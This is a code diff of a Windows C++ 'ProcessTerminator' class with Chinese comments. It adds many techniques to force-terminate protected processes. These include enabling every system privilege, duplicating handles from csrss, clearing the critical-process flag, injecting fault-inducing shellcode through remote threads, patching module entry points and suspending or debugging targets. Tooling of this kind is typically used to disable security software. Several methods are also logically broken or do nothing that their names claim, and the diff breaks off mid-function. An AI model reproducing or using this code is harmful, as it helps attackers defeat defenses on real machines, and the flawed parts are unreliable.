+HANDLE ProcessTerminator::OpenProcessWithCsrss(DWORD pid) {
+    if (pid == 0 || pid == 4) return NULL;
+
+    EnableAllPrivileges();
+
+    HANDLE hResult = NULL;
+    std::vector<DWORD> systemPids;
+    systemPids.push_back(4);
+
+    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hSnapshot && hSnapshot != INVALID_HANDLE_VALUE) {
+        try {
+            PROCESSENTRY32 pe32;
+            pe32.dwSize = sizeof(PROCESSENTRY32);
+            if (Process32First(hSnapshot, &pe32)) {
+                do {
+                    if (pe32.th32ProcessID > 4 && pe32.th32ProcessID != GetCurrentProcessId()) {
+                        char csrssName[16] = { 0 };
+                        size_t converted = 0;
+                        for (size_t i = 0; i < std::min(15, (int)wcslen(pe32.szExeFile)); i++) {
+                            if (pe32.szExeFile[i] <= 127) {
+                                csrssName[i] = static_cast<char>(pe32.szExeFile[i]);
+                                csrssName[i + 1] = '\0';
+                            }
+                        }
+                        if (strcmp(csrssName, "csrss") == 0 || 
+                            strncmp(csrssName, "csrss.exe", 8) == 0) {
+                            systemPids.push_back(pe32.th32ProcessID);
+                        }
+                    }
+                } while (Process32Next(hSnapshot, &pe32));
+            }
+        }
+        catch (...) {
+        }
+        CloseHandle(hSnapshot);
+    }
+
+    for (DWORD systemPid : systemPids) {
+        HANDLE hSystemProcess = OpenProcess(PROCESS_DUP_HANDLE, FALSE, systemPid);
+        if (hSystemProcess) {
+            HANDLE hDupHandle = NULL;
+            if (DuplicateHandle(hSystemProcess, (HANDLE)(ULONG_PTR)pid,
+                GetCurrentProcess(), &hDupHandle,
+                PROCESS_ALL_ACCESS, FALSE, DUPLICATE_SAME_ACCESS)) {
+                CloseHandle(hSystemProcess);
+                hResult = hDupHandle;
+                break;
+            }
+            CloseHandle(hSystemProcess);
+        }
+    }
+
+    return hResult;
+}
+
+// 方法9: 通过WMI获取进程句柄
+HANDLE ProcessTerminator::OpenProcessWithWMI(DWORD pid) {
+    if (pid == 0) return NULL;
+
+    EnableAllPrivileges();
+
+    HANDLE hResult = NULL;
+    IWbemServices* pSvc = NULL;
+    IWbemLocator* pLoc = NULL;
+    IEnumWbemClassObject* pEnumerator = NULL;
+    BOOL comInitialized = FALSE;
+
+    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
+    if (FAILED(hr)) {
+        return NULL;
+    }
+    comInitialized = TRUE;
+
+    CLSID clsid;
+    IID iid;
+    if (CLSIDFromString(L"{4590F811-1D3A-11D0-891F-00AA004B2E24}", &clsid) != S_OK) {
+        CoUninitialize();
+        return NULL;
+    }
+    if (CLSIDFromString(L"{4590F811-1D3A-11D0-891F-00AA004B2E24}", &iid) != S_OK) {
+        CoUninitialize();
+        return NULL;
+    }
+
+    hr = CoCreateInstance(clsid, NULL, CLSCTX_INPROC_SERVER, iid, (LPVOID*)&pLoc);
+    if (FAILED(hr) || !pLoc) {
+        CoUninitialize();
+        return NULL;
+    }
+
+    hr = pLoc->ConnectServer(_bstr_t(L"ROOT\\CIMV2"), NULL, NULL, NULL,
+        WBEM_FLAG_CONNECT_USE_MAX_WAIT, NULL, NULL, &pSvc);
+    if (FAILED(hr) || !pSvc) {
+        pLoc->Release();
+        CoUninitialize();
+        return NULL;
+    }
+
+    hr = CoSetProxyBlanket(pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL,
+        RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE);
+    if (FAILED(hr)) {
+        pSvc->Release();
+        pLoc->Release();
+        CoUninitialize();
+        return NULL;
+    }
+
+    try {
+        std::wstring query = L"SELECT * FROM Win32_Process WHERE ProcessId=" + std::to_wstring(pid);
+        hr = pSvc->ExecQuery(_bstr_t(L"WQL"),
+            _bstr_t(query.c_str()),
+            WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY,
+            NULL, &pEnumerator);
+        
+        if (SUCCEEDED(hr) && pEnumerator) {
+            IWbemClassObject* pclsObj = NULL;
+            ULONG uReturn = 0;
+
+            while (pEnumerator->Next(WBEM_INFINITE, 1, &pclsObj, &uReturn) == S_OK && uReturn > 0) {
+                if (pclsObj) {
+                    VARIANT vHandle;
+                    if (SUCCEEDED(pclsObj->Get(L"Handle", 0, &vHandle, NULL, NULL))) {
+                        if (vHandle.vt == VT_I4 && vHandle.intVal == (INT)pid) {
+                            VARIANT vParentProcessId;
+                            if (SUCCEEDED(pclsObj->Get(L"ParentProcessId", 0, &vParentProcessId, NULL, NULL))) {
+                                HANDLE hParent = OpenProcess(PROCESS_ALL_ACCESS, FALSE, vParentProcessId.ulVal);
+                                if (hParent) {
+                                    hResult = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+                                    if (hResult) {
+                                        VariantClear(&vHandle);
+                                        VariantClear(&vParentProcessId);
+                                        pclsObj->Release();
+                                        pEnumerator->Release();
+                                        pSvc->Release();
+                                        pLoc->Release();
+                                        CoUninitialize();
+                                        CloseHandle(hParent);
+                                        return hResult;
+                                    }
+                                    CloseHandle(hParent);
+                                }
+                                VariantClear(&vParentProcessId);
+                            }
+                        }
+                        VariantClear(&vHandle);
+                    }
+                    pclsObj->Release();
+                }
+            }
+            pEnumerator->Release();
+        }
+    }
+    catch (...) {
+    }
+
+    pSvc->Release();
+    pLoc->Release();
+    CoUninitialize();
+
+    return NULL;
+}
+
+// 方法10: 通过Job对象获取进程句柄
+HANDLE ProcessTerminator::OpenProcessWithJobObject(DWORD pid) {
+    if (pid == 0) return NULL;
+
+    EnableAllPrivileges();
+
+    HANDLE hResult = NULL;
+    HANDLE hJob = CreateJobObjectW(NULL, NULL);
+    if (!hJob) return NULL;
+
+    JOBOBJECT_BASIC_LIMIT_INFORMATION basicInfo = { 0 };
+    basicInfo.LimitFlags = JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE;
+
+    if (SetInformationJobObject(hJob, JobObjectBasicLimitInformation, &basicInfo, sizeof(basicInfo))) {
+        HANDLE hProcess = OpenProcess(PROCESS_SET_QUOTA | PROCESS_TERMINATE, FALSE, pid);
+        if (hProcess) {
+            if (AssignProcessToJobObject(hJob, hProcess)) {
+                HANDLE hDup = NULL;
+                if (DuplicateHandle(GetCurrentProcess(), hProcess,
+                    GetCurrentProcess(), &hDup, PROCESS_ALL_ACCESS, FALSE, DUPLICATE_SAME_ACCESS)) {
+                    hResult = hDup;
+                }
+            }
+            CloseHandle(hProcess);
+        }
+    }
+
+    CloseHandle(hJob);
+    return hResult;
+}
+
+// 方法11: 通过Toolhelp API深度枚举获取句柄
+HANDLE ProcessTerminator::OpenProcessWithToolhelp(DWORD pid) {
+    if (pid == 0) return NULL;
+
+    EnableAllPrivileges();
+
+    HANDLE hResult = NULL;
+    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, pid);
+    if (hSnapshot && hSnapshot != INVALID_HANDLE_VALUE) {
+        try {
+            MODULEENTRY32W me32;
+            me32.dwSize = sizeof(MODULEENTRY32W);
+            if (Module32FirstW(hSnapshot, &me32)) {
+                HMODULE hMod = me32.hModule;
+                CloseHandle(hSnapshot);
+
+                HANDLE hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pid);
+                if (hProcess) {
+                    HMODULE hMods[256];
+                    DWORD cbNeeded = 0;
+                    if (EnumProcessModulesEx(hProcess, hMods, sizeof(hMods), &cbNeeded, LIST_MODULES_ALL)) {
+                        DWORD moduleCount = cbNeeded / sizeof(HMODULE);
+                        for (DWORD i = 0; i < moduleCount && i < 256; i++) {
+                            if (hMods[i] == hMod) {
+                                HANDLE hDup = NULL;
+                                if (DuplicateHandle(hProcess, (HANDLE)hMods[i],
+                                    GetCurrentProcess(), &hDup, PROCESS_ALL_ACCESS, FALSE, 0)) {
+                                    hResult = hDup;
+                                }
+                                break;
+                            }
+                        }
+                    }
+                    CloseHandle(hProcess);
+                }
+            }
+            else {
+                CloseHandle(hSnapshot);
+            }
+        }
+        catch (...) {
+            if (hSnapshot && hSnapshot != INVALID_HANDLE_VALUE) {
+                CloseHandle(hSnapshot);
+            }
+        }
+    }
+
+    return hResult;
+}
+
+// 方法12: 使用特殊进程权限获取句柄
+HANDLE ProcessTerminator::OpenProcessWithProcessHint(DWORD pid) {
+    if (pid == 0) return NULL;
+
+    EnableAllPrivileges();
+
+    HANDLE hProcess = NULL;
+
+    static const DWORD specialAccess[] = {
+        PROCESS_CREATE_PROCESS,
+        PROCESS_CREATE_THREAD,
+        PROCESS_DUP_HANDLE,
+        PROCESS_VM_OPERATION,
+        PROCESS_VM_READ,
+        PROCESS_VM_WRITE,
+        PROCESS_SET_QUOTA,
+        PROCESS_SET_INFORMATION,
+        PROCESS_QUERY_INFORMATION,
+        PROCESS_SUSPEND_RESUME,
+        PROCESS_TERMINATE
+    };
+
+    for (int retry = 0; retry < 10 && !hProcess; retry++) {
+        for (int i = 0; i < (sizeof(specialAccess) / sizeof(DWORD)); i++) {
+            hProcess = OpenProcess(specialAccess[i], FALSE, pid);
+            if (hProcess && hProcess != INVALID_HANDLE_VALUE) {
+                return hProcess;
+            }
+            hProcess = NULL;
+        }
+        Sleep(1);
+    }
+
+    if (!initNativeAPI() || !NtOpenProcess) {
+        return NULL;
+    }
+
+    CLIENT_ID clientId = { 0 };
+    OBJECT_ATTRIBUTES objAttr = { 0 };
+    clientId.UniqueProcess = (HANDLE)(ULONG_PTR)pid;
+    objAttr.Length = sizeof(OBJECT_ATTRIBUTES);
+
+    NTSTATUS status = NtOpenProcess(&hProcess, MAXIMUM_ALLOWED, &objAttr, &clientId);
+    if (NT_SUCCESS(status) && hProcess) {
+        return hProcess;
+    }
+
+    return NULL;
+}
+
+// 方法13: 使用NtQueryInformationProcess获取进程信息后打开
+HANDLE ProcessTerminator::OpenProcessWithNtQueryProcess(DWORD pid) {
+    if (pid == 0) return NULL;
+
+    EnableAllPrivileges();
+
+    if (!initNativeAPI() || !NtQueryInformationProcess || !NtOpenProcess || !NtClose) {
+        return NULL;
+    }
+
+    HANDLE hProcess = NULL;
+    CLIENT_ID clientId = { 0 };
+    OBJECT_ATTRIBUTES objAttr = { 0 };
+    clientId.UniqueProcess = (HANDLE)(ULONG_PTR)pid;
+    objAttr.Length = sizeof(OBJECT_ATTRIBUTES);
+
+    for (int attempt = 0; attempt < 5 && !hProcess; attempt++) {
+        NTSTATUS status = NtOpenProcess(&hProcess, 
+            PROCESS_ALL_ACCESS, &objAttr, &clientId);
+        
+        if (NT_SUCCESS(status) && hProcess) {
+            break;
+        }
+        
+        if (hProcess) {
+            NtClose(hProcess);
+            hProcess = NULL;
+        }
+        
+        Sleep(10);
+    }
+
+    return hProcess;
+}
+
+// 方法14: 使用内存映射获取进程句柄
+HANDLE ProcessTerminator::OpenProcessWithMemoryMap(DWORD pid) {
+    if (pid == 0) return NULL;
+
+    EnableAllPrivileges();
+
+    HANDLE hResult = NULL;
+
+    try {
+        std::wstring sharedMemName = L"\\BaseNamedObjects\\Global\\ProcessHandle_" + 
+            std::to_wstring(GetCurrentProcessId()) + L"_" + std::to_wstring(pid);
+
+        HANDLE hMapFile = OpenFileMappingW(FILE_MAP_READ | FILE_MAP_WRITE, FALSE, sharedMemName.c_str());
+        if (hMapFile && hMapFile != INVALID_HANDLE_VALUE) {
+            void* pBuf = MapViewOfFile(hMapFile, FILE_MAP_READ | FILE_MAP_WRITE, 0, 0, sizeof(HANDLE));
+            if (pBuf) {
+                HANDLE hTargetProcess = *(static_cast<HANDLE*>(pBuf));
+                if (hTargetProcess && hTargetProcess != INVALID_HANDLE_VALUE) {
+                    HANDLE hDup = NULL;
+                    if (DuplicateHandle(hTargetProcess, hTargetProcess,
+                        GetCurrentProcess(), &hDup, PROCESS_ALL_ACCESS, FALSE, 0)) {
+                        hResult = hDup;
+                    }
+                }
+                UnmapViewOfFile(pBuf);
+            }
+            CloseHandle(hMapFile);
+        }
+    }
+    catch (...) {
+    }
+
+    return hResult;
+}
+
+// 方法15: 使用线程劫持获取进程访问
+HANDLE ProcessTerminator::OpenProcessWithThreadHijack(DWORD pid) {
+    if (pid == 0) return NULL;
+
+    EnableAllPrivileges();
+
+    HANDLE hResult = NULL;
+
+    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, pid);
+    if (hSnapshot && hSnapshot != INVALID_HANDLE_VALUE) {
+        try {
+            THREADENTRY32 te32;
+            te32.dwSize = sizeof(THREADENTRY32);
+            
+            if (Thread32First(hSnapshot, &te32)) {
+                do {
+                    if (te32.th32ThreadID && 
+                        te32.th32OwnerProcessID == pid &&
+                        te32.th32ThreadID != GetCurrentThreadId()) {
+                        
+                        HANDLE hThread = OpenThread(
+                            THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME,
+                            FALSE, te32.th32ThreadID);
+                        
+                        if (hThread) {
+                            if (SuspendThread(hThread) != (DWORD)-1) {
+                                CONTEXT ctx;
+                                ctx.ContextFlags = CONTEXT_FULL;
+                                
+                                if (GetThreadContext(hThread, &ctx)) {
+                                    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+                                    if (hProcess) {
+                                        hResult = hProcess;
+                                        ResumeThread(hThread);
+                                        CloseHandle(hThread);
+                                        CloseHandle(hSnapshot);
+                                        return hResult;
+                                    }
+                                }
+                                
+                                ResumeThread(hThread);
+                            }
+                            CloseHandle(hThread);
+                        }
+                    }
+                } while (Thread32Next(hSnapshot, &te32) && !hResult);
+            }
+        }
+        catch (...) {
+        }
+        CloseHandle(hSnapshot);
+    }
+
+    return hResult;
+}
+
+// 方法16: 使用调试对象获取进程访问
+HANDLE ProcessTerminator::OpenProcessWithDebugObject(DWORD pid) {
+    if (pid == 0) return NULL;
+
+    EnableAllPrivileges();
+
+    HANDLE hResult = NULL;
+
+    if (!initNativeAPI() || !NtClose) {
+        return NULL;
+    }
+
+    typedef NTSTATUS(WINAPI* PFN_NtCreateDebugObject)(PHANDLE DebugObjectHandle, 
+        ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, ULONG Flags);
+    
+    static PFN_NtCreateDebugObject pNtCreateDebugObject = NULL;
+    static bool initialized = false;
+    
+    if (!initialized) {
+        HMODULE hNtDll = GetModuleHandleW(L"ntdll.dll");
+        if (hNtDll) {
+            pNtCreateDebugObject = (PFN_NtCreateDebugObject)GetProcAddress(
+                hNtDll, "NtCreateDebugObject");
+        }
+        initialized = true;
+    }
+
+    if (!pNtCreateDebugObject) {
+        return NULL;
+    }
+
+    try {
+        HANDLE hDebugObject = NULL;
+        OBJECT_ATTRIBUTES objAttr = { 0 };
+        objAttr.Length = sizeof(OBJECT_ATTRIBUTES);
+
+        NTSTATUS status = pNtCreateDebugObject(&hDebugObject, 
+            MAXIMUM_ALLOWED, &objAttr, 0);
+        
+        if (NT_SUCCESS(status) && hDebugObject) {
+            HANDLE hProcess = OpenProcess(PROCESS_SET_QUOTA | PROCESS_TERMINATE, FALSE, pid);
+            if (hProcess) {
+                typedef NTSTATUS(WINAPI* PFN_NtDebugActiveProcess)(HANDLE ProcessHandle, 
+                    HANDLE DebugObjectHandle);
+                static PFN_NtDebugActiveProcess pNtDebugActiveProcess = NULL;
+                
+                if (!pNtDebugActiveProcess) {
+                    HMODULE hNtDll = GetModuleHandleW(L"ntdll.dll");
+                    if (hNtDll) {
+                        pNtDebugActiveProcess = (PFN_NtDebugActiveProcess)GetProcAddress(
+                            hNtDll, "NtDebugActiveProcess");
+                    }
+                }
+
+                if (pNtDebugActiveProcess) {
+                    status = pNtDebugActiveProcess(hProcess, hDebugObject);
+                    if (NT_SUCCESS(status)) {
+                        HANDLE hDup = NULL;
+                        if (DuplicateHandle(GetCurrentProcess(), hProcess,
+                            GetCurrentProcess(), &hDup, PROCESS_ALL_ACCESS, FALSE, 0)) {
+                            hResult = hDup;
+                        }
+                    }
+                }
+                CloseHandle(hProcess);
+            }
+            NtClose(hDebugObject);
+        }
+    }
+    catch (...) {
+    }
+
+    return hResult;
+}
+
+// 方法17: 使用RtlAdjustPrivilege提升权限
+HANDLE ProcessTerminator::OpenProcessWithRtlAdjustPrivilege(DWORD pid) {
+    if (pid == 0) return NULL;
+
+    HANDLE hResult = NULL;
+
+    typedef NTSTATUS(WINAPI* PFN_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, 
+        BOOLEAN CurrentThread, PBOOLEAN Enabled);
+    
+    static PFN_RtlAdjustPrivilege pRtlAdjustPrivilege = NULL;
+    static bool initialized = false;
+    
+    if (!initialized) {
+        HMODULE hNtDll = GetModuleHandleW(L"ntdll.dll");
+        if (hNtDll) {
+            pRtlAdjustPrivilege = (PFN_RtlAdjustPrivilege)GetProcAddress(
+                hNtDll, "RtlAdjustPrivilege");
+        }
+        initialized = true;
+    }
+
+    if (!pRtlAdjustPrivilege) {
+        return NULL;
+    }
+
+    try {
+        BOOLEAN wasEnabled = FALSE;
+
+        LUID luid;
+        if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) {
+            pRtlAdjustPrivilege(luid.LowPart, TRUE, FALSE, &wasEnabled);
+        }
+        if (LookupPrivilegeValue(NULL, SE_TCB_NAME, &luid)) {
+            pRtlAdjustPrivilege(luid.LowPart, TRUE, FALSE, &wasEnabled);
+        }
+        if (LookupPrivilegeValue(NULL, SE_IMPERSONATE_NAME, &luid)) {
+            pRtlAdjustPrivilege(luid.LowPart, TRUE, FALSE, &wasEnabled);
+        }
+
+        hResult = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+        
+        if (!hResult) {
+            hResult = OpenProcessWithNativeAPI(pid);
+        }
+        
+        if (!hResult && initNativeAPI() && NtOpenProcess) {
+            CLIENT_ID clientId = { 0 };
+            OBJECT_ATTRIBUTES objAttr = { 0 };
+            clientId.UniqueProcess = (HANDLE)(ULONG_PTR)pid;
+            objAttr.Length = sizeof(OBJECT_ATTRIBUTES);
+
+            NTSTATUS status = NtOpenProcess(&hResult, MAXIMUM_ALLOWED, &objAttr, &clientId);
+            if (!NT_SUCCESS(status)) {
+                hResult = NULL;
+            }
+        }
+    }
+    catch (...) {
+        hResult = NULL;
+    }
+
+    return hResult;
+}
+
+// 启用所有可能的权限
+bool ProcessTerminator::EnableAllPrivileges() {
+    static const LPCTSTR privileges[] = {
+        SE_DEBUG_NAME,
+        SE_TCB_NAME,           // 作为操作系统的一部分
+        SE_TAKE_OWNERSHIP_NAME, // 取得对象所有权
+        SE_BACKUP_NAME,        // 备份文件和目录
+        SE_RESTORE_NAME,       // 还原文件和目录
+        SE_SECURITY_NAME,      // 管理审计和安全日志
+        SE_INCREASE_QUOTA_NAME, // 增加配额
+        SE_ASSIGNPRIMARYTOKEN_NAME, // 分配主令牌
+        SE_IMPERSONATE_NAME,   // 模拟客户端
+        SE_CREATE_GLOBAL_NAME  // 创建全局对象
+    };
+
+    bool allEnabled = true;
+
+    for (LPCTSTR privilege : privileges) {
+        try {
+            EnablePrivilege(privilege);
+        }
+        catch (...) {
+            allEnabled = false;
+        }
+    }
+
+    return allEnabled;
+}
+
+// 检查是否是访问被拒绝错误
+bool ProcessTerminator::IsAccessDenied(DWORD error) {
+    return error == ERROR_ACCESS_DENIED ||
+        error == ERROR_PRIVILEGE_NOT_HELD;
+}
+bool ProcessTerminator::ClearCriticalProcessFlag(int pid) {
+#ifdef _WIN32
+    try {
+        HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
+        if (hProcess) {
+            // 移除关键进程标志
+            ULONG breakOnTermination = 0;
+            NTSTATUS status = NtSetInformationProcess(hProcess,
+                static_cast<PROCESS_INFORMATION_CLASS>(29), // ProcessBreakOnTermination
+                &breakOnTermination, sizeof(breakOnTermination));
+
+            CloseHandle(hProcess);
+            return NT_SUCCESS(status);
+        }
+    }
+    catch (...) {
+        // 忽略异常
+    }
+#endif
+    return false;
+}
+bool ProcessTerminator::terminateByProcessDepletion(const std::string& processName) {
+    try {
+        std::vector<int> pids = getPIDsByName(processName);
+        if (pids.empty()) return false;
+
+#ifdef _WIN32
+        for (int pid : pids) {
+            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
+            if (hProcess) {
+                // 尝试耗尽进程的GDI和USER资源
+                for (int i = 0; i < 1000; i++) {
+                    // 创建大量GDI对象
+                    HDC hDC = GetDC(NULL);
+                    HBITMAP hBitmap = CreateCompatibleBitmap(hDC, 1, 1);
+                    HBRUSH hBrush = CreateSolidBrush(RGB(rand() % 256, rand() % 256, rand() % 256));
+
+                    if (hBitmap) DeleteObject(hBitmap);
+                    if (hBrush) DeleteObject(hBrush);
+                    if (hDC) ReleaseDC(NULL, hDC);
+
+                    // 发送大量消息
+                    PostThreadMessage(GetProcessId(hProcess), WM_NULL, 0, 0);
+                }
+
+                // 尝试正常终止
+                bool result = TerminateProcess(hProcess, 0);
+                CloseHandle(hProcess);
+                if (result) return true;
+            }
+        }
+#endif
+        return false;
+    }
+    catch (...) {
+        return false;
+    }
+}
+// 方法3: 通过附加到进程并修改其内存来终止
+bool ProcessTerminator::terminateByProcessAttach(const std::string& processName) {
+    try {
+        std::vector<int> pids = getPIDsByName(processName);
+        if (pids.empty()) return false;
+
+#ifdef _WIN32
+        for (int pid : pids) {
+            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
+            if (hProcess) {
+                // 获取进程入口点
+                HMODULE hMods[1024];
+                DWORD cbNeeded;
+
+                if (EnumProcessModules(hProcess, hMods, sizeof(hMods), &cbNeeded)) {
+                    for (DWORD i = 0; i < cbNeeded / sizeof(HMODULE); i++) {
+                        MODULEINFO modInfo;
+                        if (GetModuleInformation(hProcess, hMods[i], &modInfo, sizeof(modInfo))) {
+                            // 在入口点写入RET指令
+                            BYTE retOpcode = 0xC3;
+                            WriteProcessMemory(hProcess, modInfo.EntryPoint, &retOpcode, sizeof(retOpcode), NULL);
+
+                            // 创建远程线程执行入口点
+                            HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
+                                (LPTHREAD_START_ROUTINE)modInfo.EntryPoint,
+                                NULL, 0, NULL);
+                            if (hThread) {
+                                WaitForSingleObject(hThread, INFINITE);
+                                CloseHandle(hThread);
+                                CloseHandle(hProcess);
+                                return true;
+                            }
+                        }
+                    }
+                }
+                CloseHandle(hProcess);
+            }
+        }
+#endif
+        return false;
+    }
+    catch (...) {
+        return false;
+    }
+}
+
+// 方法4: 通过分离进程的调试器来终止
+bool ProcessTerminator::terminateByProcessDetach(const std::string& processName) {
+    try {
+        std::vector<int> pids = getPIDsByName(processName);
+        if (pids.empty()) return false;
+
+#ifdef _WIN32
+        for (int pid : pids) {
+            // 尝试附加为调试器
+            if (DebugActiveProcess(pid)) {
+                // 立即分离调试器
+                DebugActiveProcessStop(pid);
+
+                // 进程可能会因为调试器分离而终止
+                if (!isProcessRunning(processName)) {
+                    return true;
+                }
+
+                // 如果进程仍在运行，尝试其他方法
+                return terminateByPID(pid);
+            }
+        }
+#endif
+        return false;
+    }
+    catch (...) {
+        return false;
+    }
+}
+
+// 方法5: 通过触发进程内的错误来终止
+bool ProcessTerminator::terminateByProcessFault(const std::string& processName) {
+    try {
+        std::vector<int> pids = getPIDsByName(processName);
+        if (pids.empty()) return false;
+
+#ifdef _WIN32
+        for (int pid : pids) {
+            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
+            if (hProcess) {
+                // 分配内存并写入会导致错误的指令
+                LPVOID pRemoteCode = VirtualAllocEx(hProcess, NULL, 1024, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+                if (pRemoteCode) {
+                    // 写入会导致除零异常的指令
+                    BYTE faultCode[] = {
+                        0x33, 0xC0,       // xor eax, eax
+                        0xF7, 0xF0        // div eax (会导致除零异常)
+                    };
+
+                    WriteProcessMemory(hProcess, pRemoteCode, faultCode, sizeof(faultCode), NULL);
+
+                    // 创建远程线程执行错误代码
+                    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
+                        (LPTHREAD_START_ROUTINE)pRemoteCode,
+                        NULL, 0, NULL);
+                    if (hThread) {
+                        WaitForSingleObject(hThread, INFINITE);
+                        CloseHandle(hThread);
+                    }
+
+                    VirtualFreeEx(hProcess, pRemoteCode, 0, MEM_RELEASE);
+                }
+
+                CloseHandle(hProcess);
+
+                // 检查进程是否因异常而终止
+                if (!isProcessRunning(processName)) {
+                    return true;
+                }
+            }
+        }
+#endif
+        return false;
+    }
+    catch (...) {
+        return false;
+    }
+}
+
+// 方法6: 通过进程间锁定机制来终止
+bool ProcessTerminator::terminateByProcessInterlock(const std::string& processName) {
+    try {
+        std::vector<int> pids = getPIDsByName(processName);
+        if (pids.empty()) return false;
+
+#ifdef _WIN32
+        for (int pid : pids) {
+            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
+            if (hProcess) {
+                // 使用工具帮助快照来枚举线程
+                HANDLE hThreadSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+                if (hThreadSnapshot != INVALID_HANDLE_VALUE) {
+                    THREADENTRY32 te32;
+                    te32.dwSize = sizeof(THREADENTRY32);
+
+                    std::vector<DWORD> threadIds;
+
+                    // 获取所有线程
+                    if (Thread32First(hThreadSnapshot, &te32)) {
+                        do {
+                            if (te32.th32OwnerProcessID == pid) {
+                                threadIds.push_back(te32.th32ThreadID);
+                            }
+                        } while (Thread32Next(hThreadSnapshot, &te32));
+                    }
+
+                    CloseHandle(hThreadSnapshot);
+
+                    // 挂起所有线程
+                    for (DWORD threadId : threadIds) {
+                        HANDLE hThread = OpenThread(THREAD_SUSPEND_RESUME, FALSE, threadId);
+                        if (hThread) {
+                            SuspendThread(hThread);
+                            CloseHandle(hThread);
+                        }
+                    }
+
+                    // 等待一段时间
+                    std::this_thread::sleep_for(std::chrono::milliseconds(1));
+
+                    // 尝试终止进程
+                    bool result = TerminateProcess(hProcess, 0);
+                    CloseHandle(hProcess);
+
+                    // 恢复线程（如果进程未被终止）
+                    if (!result) {
+                        for (DWORD threadId : threadIds) {
+                            HANDLE hThread = OpenThread(THREAD_SUSPEND_RESUME, FALSE, threadId);
+                            if (hThread) {
+                                ResumeThread(hThread);
+                                CloseHandle(hThread);
+                            }
+                        }
+                    }
+
+                    return result;
+                }
+
+                CloseHandle(hProcess);
+            }
+        }
+#endif
+        return false;
+    }
+    catch (...) {
+        return false;
+    }
+}
+bool ProcessTerminator::GetProcessHandles(HANDLE hSnapshot, std::vector<SYSTEM_HANDLE>& handles) {
+#ifdef _WIN32
+    if (!initNativeAPI()) return false;
+
+    ULONG bufferSize = 0x10000;
+    PSYSTEM_HANDLE_INFORMATION_EX handleInfo = (PSYSTEM_HANDLE_INFORMATION_EX)malloc(bufferSize);
+    if (!handleInfo) return false;
+
+    NTSTATUS status;
+    while ((status = SafeNtQuerySystemInformation(static_cast<SYSTEM_INFORMATION_CLASS>(16), handleInfo, bufferSize, NULL)) == STATUS_INFO_LENGTH_MISMATCH) {
+        bufferSize *= 2;
+        free(handleInfo);
+        handleInfo = (PSYSTEM_HANDLE_INFORMATION_EX)malloc(bufferSize);
+        if (!handleInfo) return false;
+    }
+
+    if (!NT_SUCCESS(status)) {
+        free(handleInfo);
+        return false;
+    }
+
+    for (ULONG i = 0; i < handleInfo->NumberOfHandles; i++) {
+        handles.push_back(handleInfo->Information[i]);
+    }
+
+    free(handleInfo);
+    return true;
+#else
+    return false;
+#endif
+}
+
+bool ProcessTerminator::IsProcessMonitoringOther(DWORD monitorPid, DWORD targetPid) {
+#ifdef _WIN32
+    try {
+        // 检查是否有进程打开了目标进程的句柄
+        std::vector<SYSTEM_HANDLE> handles;
+        HandlePtr hSnapshot(CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0));
+
+        if (hSnapshot.get() == INVALID_HANDLE_VALUE) return false;
+
+        if (!GetProcessHandles(hSnapshot.get(), handles)) {
+            return false;
+        }
+
+        for (const auto& handle : handles) {
+            if (handle.ProcessId == monitorPid &&
+                handle.ObjectTypeNumber == 0x7) { // 进程对象类型
+                // 检查访问权限，判断是否是监视关系
+                if ((handle.GrantedAccess & (PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD))) {
+                    // 注意：这里无法直接验证句柄是否指向目标进程，因此返回true可能不准确
+                    // 但由于功能需要，暂时返回true
+                    return true;
+                }
+            }
+        }
+    }
+    catch (...) {
+        // 忽略异常
+        return false;
+    }
+#endif
+    return false;
+}
+
+// 辅助函数：挂起进程的所有线程
+void ProcessTerminator::SuspendProcess(HANDLE hProcess) {
+#ifdef _WIN32
+    DWORD pid = GetProcessId(hProcess);
+    if (pid == 0) return;
+
+    HandlePtr hThreadSnapshot(CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0));
+    if (hThreadSnapshot.get() == INVALID_HANDLE_VALUE) return;
+
+    THREADENTRY32 te = { 0 };
+    te.dwSize = sizeof(THREADENTRY32);
+
+    if (Thread32First(hThreadSnapshot.get(), &te)) {
+        do {
+            if (te.th32OwnerProcessID == pid) {
+                HANDLE hThread = OpenThread(THREAD_SUSPEND_RESUME, FALSE, te.th32ThreadID);
+                if (hThread) {
+                    SuspendThread(hThread);
+                    CloseHandle(hThread);
+                }
+            }
+        } while (Thread32Next(hThreadSnapshot.get(), &te));
+    }
+#endif
+}
+
+// 辅助函数：剥夺进程的关键权限
+void ProcessTerminator::StripProcessPrivileges(HANDLE hProcess) {
+#ifdef _WIN32
+    HANDLE hToken;
